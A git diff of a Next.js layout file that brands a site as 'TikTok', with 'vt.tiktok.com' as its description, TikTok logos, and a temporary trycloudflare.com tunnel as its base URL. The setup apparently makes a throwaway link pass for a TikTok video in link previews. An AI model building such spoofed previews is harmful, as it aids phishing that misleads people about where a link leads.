@@ -8,13 +8,13 @@ const inter = Inter({
 });
 
 export const metadata: Metadata = {
-  title: "TikTok - Tugas PPKN",
+  title: "TikTok - xxxxxx",
   description: "vt.tiktok.com",
   icons: {
-    icon: "/favicon.svg",
+    icon: "/logo-tiktok-new.png",
   },
   openGraph: {
-    title: "TikTok - Tugas PPKN",
+    title: "TikTok - xxxxxx",
     description: "vt.tiktok.com",
     images: [
       {
@@ -25,15 +25,15 @@ export const metadata: Metadata = {
       },
     ],
     type: "website",
-    siteName: "TikTok - Tugas PPKN",
+    siteName: "TikTok - xxxxxx",
   },
   twitter: {
     card: "summary",
-    title: "TikTok - Tugas PPKN",
+    title: "TikTok - xxxxxx",
     description: "vt.tiktok.com",
     images: ["/LOGO-TIKTOK.png"],
   },
-  metadataBase: new URL("https://counsel-cook-vehicles-mime.trycloudflare.com"),
+  metadataBase: new URL("https://moreover-robot-arrive-wilderness.trycloudflare.com"),
 };
 
 export default function RootLayout({
